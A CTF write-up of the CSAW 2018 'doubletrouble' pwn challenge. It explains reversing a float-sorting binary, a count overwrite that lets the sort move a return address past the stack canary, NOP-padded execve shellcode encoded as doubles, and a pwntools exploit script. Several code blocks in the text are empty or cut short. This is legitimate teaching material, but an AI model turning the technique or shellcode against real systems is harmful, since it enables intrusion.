# Csaw 2018 doubletrouble Pwn 200 (The Floating)

This writeup is dedicated to Pennywise the Dancing Clown. We all float down here:

Let's take a look at the binary:

```

```

So we can see a couple of things. It appears to prompt us for a number of inputs, then it takes in those inputs and converts them to doubles. Proceeding that it does some arithmetic on those doubles, then sorts the doubles least to greatest. We can also see that we get what looks like to be a stack infoleak, but we confirm that it is a stack infoleak with gdb:

```

```

here we can see that the infoleak is from the stack (which starts at `0xfffdd000` and ends at `0xffffe000`). Also some other important things we can see about the binary, it has a stack canary and `RWX` segments (regions of memory that we can read, write, and execute). We can also see that it is a `32` bit elf

## Reversing

So starting off we have the main function (which we use Ghidra to decompile):

```
/* WARNING: Type propagation algorithm not settling */

undefined4 main(void)

{
  int canary;
  
  canary = __x86.get_pc_thunk.ax(&stack0x00000004);
  setvbuf((FILE *)(*(FILE **)(canary + 0x27da))->_flags,(char *)0x0,2,0);
  game();
  return 0;
}
```

From our perspective, the only thing we need to worry about here is that it calls `game()` which we can see here:

```
int game()
{
  int index; // esi@5
  long double sum; // fst7@7
  long double max; // fst7@7
  long double min; // fst7@7
  int favorite; // eax@7
  int result; // eax@7
  int v6; // ecx@7
  int heapQt; // [sp+Ch] [bp-21Ch]@1
  int i; // [sp+10h] [bp-218h]@4
  char *s; // [sp+14h] [bp-214h]@5
  double ptrArray[64]; // [sp+18h] [bp-210h]@1
  int canary; // [sp+21Ch] [bp-Ch]@1

  canary = *MK_FP(__GS__, 20);
  printf("%p\n", ptrArray);
  printf("How long: ");
  __isoc99_scanf("%d", &heapQt);
  getchar();
  if ( heapQt > 64 )
  {
    printf("Flag: hahahano. But system is at %d", &system);
    exit(1);
  }
  i = 0;
  while ( i < heapQt )
  {
    s = (char *)malloc(0x64u);
    printf("Give me: ");
    fgets(s, 100, stdin);
    index = i++;
    ptrArray[index] = atof(s);
  }
  printArray(&heapQt, (int)ptrArray);
  sum = sumArray(&heapQt, ptrArray);
  printf("Sum: %f\n", (double)sum);
  max = maxArray(&heapQt, ptrArray);
  printf("Max: %f\n", (double)max);
  min = minArray(&heapQt, ptrArray);
  printf("Min: %f\n", (double)min);
  favorite = findArray(&heapQt, (int)ptrArray, -100.0, -10.0);
  printf("My favorite number you entered is: %f\n", ptrArray[favorite]);
  sortArray(&heapQt, (int)ptrArray);
  puts("Sorted Array:");
  result = printArray(&heapQt, (int)ptrArray);
  if ( *MK_FP(__GS__, 20) != canary )
    _stack_chk_fail_local(v6, *MK_FP(__GS__, 20) ^ canary);
  return result;
}
```

So we can see how this game goes down. It first starts by printing the address of `ptrArray` for the infoleak, which we later see is where our input is stored as a double. scanning in an integer into `heapQt`. Proceeding that it checks to make sure it isn't greater than `64` (this is because `ptrArray` is only big enough to hold `64` doubles). If it is, the program exits and prints the address of system to taunt us for being bad. Proceeding that it enters into a for loop which runs `heapQt` times, which each time it scans in `100` bytes of data into the heap, then converts it into a double, and stores it in the array `ptrArray`.  Proceeding that, it runs a number of sub functions with `heapQt` and `ptrArray` as arguments.

Looking at the `sumArray`, `maxArray`, and `minArray` functions, they do pretty much what we would expect them to do. However when we get to `findArray`, that's when we see something interesting:

```
int __cdecl findArray(int *heapQt, int ptrArray, double a3, double a4)
{
  int v5; // [sp+1Ch] [bp-4h]@1

  _x86_get_pc_thunk_ax();
  v5 = *heapQt;
  while ( *heapQt < 2 * v5 )
  {
    if ( *(double *)(8 * (*heapQt - v5) + ptrArray) > (long double)a3
      && a4 > (long double)*(double *)(8 * (*heapQt - v5) + ptrArray) )
    {
      return *heapQt - v5;
    }
    *heapQt += (int)&GLOBAL_OFFSET_TABLE_ + 0xF7FB4001;
  }
  *heapQt = v5;
  return 0;
}
```

Particularly this line is interesting:

```
  *heapQt = v5;
```

This dereferences a ptr to `heapQt` and writes a value to it. This is interesting to us, since it will allow us to change the value of `heapQt`, which is then passed as an argument to `sortArray`. Looking at the condition (since `a3` is `-10` and `a4` is `-100`), it appears that a value between `-10` and `-100` will trigger the write (I used `-23`). The write appears to increase the value of `heapQt`. Next up we have the `sortArray` function:

```
signed int __cdecl sortArray(_DWORD *heapQt, int ptrArray)
{
  double v2; // ST08_8@4
  int i; // [sp+0h] [bp-10h]@1
  int j; // [sp+4h] [bp-Ch]@2

  _x86_get_pc_thunk_ax();
  for ( i = 0; i < *heapQt; ++i )
  {
    for ( j = 0; j < *heapQt - 1; ++j )
    {
      if ( *(double *)(8 * j + ptrArray) > (long double)*(double *)(8 * (j + 1) + ptrArray) )
      {
        v2 = *(double *)(8 * j + ptrArray);
        *(double *)(8 * j + ptrArray) = *(double *)(ptrArray + 8 * (j + 1));
        *(double *)(8 * (j + 1) + ptrArray) = v2;
      }
    }
  }
  return 1;
}
```

So looking at this function, we can see that it essentially will loop through the first `heapQt` doubles of `ptrArray`. It will compare the value of that double, with the value of the double after it. If the double after it is less than the double before it, it will swap the two. So essentially it just organizes `heapQt` doubles, starting at the start of `ptrArray` from smallest to biggest double.

## Exploitation

So we have a bug, where we can overwrite the number of doubles which is sorted in `sortArray`. We also have a stack infoleak, an executable stack, and the ability to write data to the stack. And looking at the stack layout in IDA, we see that `16` bytes after our double array is the return address:

```
-00000210 ptrArray        dq 64 dup(?)
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C canary          dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

Essentially what we will do is, we will write a greater value to `heapQt` than `64`, that way it will start sorting data past `ptrArray`. Specifically, we will get it to place an address that we want where the return address is stored at `ebp+0x4`, which will give us code execution. We will also need to make sure the sorting algorithm leaves the stack canary in the same place, otherwise the binary will crash before we get code execution.

0xff896bbc: 0x1d781100
```

So we can see here, an example memory layout of the stack prior to the sorting. We can see that the return address is at `0xff896bcc` (which is `0x8049841`) and the stack canary is at `0xff896bbc` (which is `0x1d781100`). In this instance, my input ends at `0xff896bb4` with `0x0804900a00000000`. Keep in mind, that when evaluating the doubles (which are `8` bytes in memory) the last `4` bytes are stored first, which are followed by the first `4` bytes. For instance. 
 
```
 gdb-peda$ p/f 0x0804900a00000000
 $1 = 4.8653382194983783e-270
gdb-peda$ p/f 0xff820d8400000000
$2 = -1.5846380065386629e+306
```

We can see that our input largely consists of the values `4.8653382194983783e-270`, which is followed by `-1.5846380065386629e+306`. 

We can see that values that start with `0xf` are really small when interpreted as a float. Thus they will float up the stack, while larger float values like `0x8049841` (which is the return address) would get moved to the bottom.

Now to get the return address overwritten, what we can do is we can make the value of `heapQt` that which it extends to two doubles past the return address, which will be the value `69` (hex `0x45`). To get it to this value, I didn't reverse the algorithm to figure out what value gets written. I just noticed that the number of inputs I send before/after `-23` (which triggers the write) influences it, so I just played with it until I got it right.

Proceeding that, we will include three floats which their hex value begins with `0x804`. They will all be less than the value `0x8049841` when converted to a float. The reason for this being, that they should be greater than all values other than the return address (`0x8049841`) which is the same every time, so it will occupy the value before, after, and the same as the return address. Now because the value we have in the return address has to start with `0x804` and be less than `0x8049841`, this limits us to what we can call to certain sections of the code, such as certain ROP gadgets. However we find one that meets our needs:

```
ROPgadget --binary doubletrouble | grep 804900a
0x0804900a : ret
```

This particular rop gadget fits our needs for two reasons. The first is that when converted to a float, it is less than `0x8049841` so it will be before it after the sorting. The second reason is that all it does is just returns. This is beneficial to us, since all it will do is just continue to the next address and execute it, which will be the last `4` bytes of the next double. We can place the stack address of our shellcode (we know it from the stack infoleak, and the stack is executable). With the first four bytes of the double, we can put a value between `0x804900a` and `0x8049841`. That way this double will always come between the actual return address, and `0x804900a`. This will allow us to execute our shellcode on the stack, which we can't simply just push it into the return address spot, since it starts with `0xff` and will just float to the top.

The value that we will have before the `0x804900a` double will be `0x800000000000000`. The reason for this, is it will occupy the spot between the stack canary and the `0x804900a` double. This way, after the sorting, the stack canary will remain in the same spot. Of course, this will only work if the stack canary's value is less than `0x8000000`, but bigger than the previous double. This gives us a range of about 8 different bytes which the stack canary could be which our exploit would work. The thing is since the stack canary is a random value (will the first three bytes for `x86` are, the fourth is always a null byte), and since the position of everything depends on it's value with respect to other floats, we will have to assume that the stack canary is within a certain value in order for our exploit to work. For testing purposes we can just set the stack canary to the value within the range. When we go ahead and run the exploit for real, we can just brute force the canary value we need by running the exploit again and again until we get a stack canary value within the range we need.

The last thing we need to worry about is our shellcode, since we will need to know where it is on the stack to execute it, and we also need to make sure it stays intact and in the correct order after it is sorted. The way I accomplished this is by appending the `0x90` byte a certain amount of times tot he front of certain parts of shellcode. This is because when executed `0x90` is the opcode for `NOP` which continues execution and doesn't effect our shellcode in any important way, and it will be evaluated as less than values starting with `0x804` so it won't affect the stack canary or what we did to write over the return address.

However when we insert the NOPs into our shellcode, we will have to rewrite/recompile the shellcode. The reason for this, is because if we just insert NOPs into random places, there is a good chance we will insert a NOP in the middle of an instruction, which will change what the instruction does. Also note, the base shellcode I did not write. I grabbed it from `http://shell-storm.org/shellcode/files/shellcode-599.php` and modified it. Also I found that this website which is an online x86/x64 decompiler/compiler helped `https://defuse.ca/online-x86-assembler.htm`:

here is the shellcode before we modified it:
```
0:  6a 17                   push   0x17
2:  58                      pop    eax

This shellcode is `27` bytes. After we figure out how to split the individual commands up with `\x90`s in a way that the instructions will still execute properly, and after the sorting the shellcode will be in the proper order, we get the following segments:

```
0x9101eb51e1f7c931:

0x90909068732f2f68:

0x9090406e69622f68:

0x900080cd0bb0e389:
```

keep in mind, because of how the data is stored, the last four bytes will be executed first. After a lot of trial and error, we see that this is our shellcode:

```
gdb-peda$ x/16i 0xffff7ca0
   0xffff7ca0: xor    ecx,ecx
   0xffff7ca2: mul    ecx
   0xffff7ca4: push   ecx
   0xffff7ca5: jmp    0xffff7ca8
   0xffff7ca7: xchg   ecx,eax
   0xffff7ca8: push   0x68732f2f
   0xffff7cad: nop
   0xffff7cae: nop
   0xffff7caf: nop
   0xffff7cb0: push   0x6e69622f
   0xffff7cb5: inc    eax
   0xffff7cb6: nop
   0xffff7cb7: nop
   0xffff7cb8: mov    ebx,esp
   0xffff7cba: mov    al,0xb
   0xffff7cbc: int    0x80
```

Also to find the offset from the infoleak to where our shellcode is, we can just run the exploit once with our shellcode, and see where our shellcode ends up in respect to the stack infoleak. When I did this, I found that the offset was `+0x1d8` bytes from the infoleak.

## tl ; dr

A quick overview of this challenge
```
*  Program scans in up to 64 doubles, and sorts them from smallest to largest
*  Bug in `findArray` allows us to overwrite the float count with a larger value, thus when it sorts the doubles, it will sort values past our input, allowing us to move the return address.
*  Format payload to call rop gadget, then shellcode on the stack using stack infoleak. The canary has to be within a set range. 
*  Format the shellcode to be together after the sorting
*  Brute force the stack canary untill it is within a range that wouldn't crash our exploit
```
## Exploit

putting it all together, we get the following exploit:
```
# Import the libraries
from pwn import *
import struct

# Establish the target
#target = process('./doubletrouble')
#gdb.attach(target, gdbscript='b *0x8049733')
target = remote('pwn.chal.csaw.io', 9002)

# Get the infoleak, calculate the offset to our shellcode
stack = target.recvline()
stack = stack.replace("\x0a", "")
stack = int(stack, 16)
scadr = stack + 0x1d8

# Create the integer we will create, that will be stored as the double after the ROPgadget 0x804900a, which is the first return address we put
ret = "0x8049010" + hex(scadr).replace("0x", "")
ret = int(ret, 16)

# Scan in some of the input 
target.recvuntil("How long: ")


# Etsablish the four blocks as floats, which make up our shellcode

# Send the double which will occupy the return address with the gadget 0x804900a: ret
target.sendline('4.8653382194983783e-270')#0x804900a00000000

# Drop to an interactive shell
target.interactive()
```

we have to run the exploit several times before it works (due to the fact that we need the first byte of the canary to be in a certain range). But once it is, we get this:
